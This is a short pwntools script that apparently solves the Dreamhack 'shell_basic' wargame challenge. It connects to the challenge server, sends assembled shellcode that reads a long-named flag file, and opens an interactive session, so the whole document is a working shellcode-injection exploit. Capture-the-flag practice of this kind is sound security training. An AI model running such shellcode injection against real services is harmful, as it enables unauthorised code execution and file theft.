from pwn import *
context.arch='amd64'
context.log_level='debug'

p=remote("host3.dreamhack.games",12682)
p.sendafter(":",asm(shellcraft.cat("/home/shell_basic/flag_name_is_loooooong")))
p.interactive()
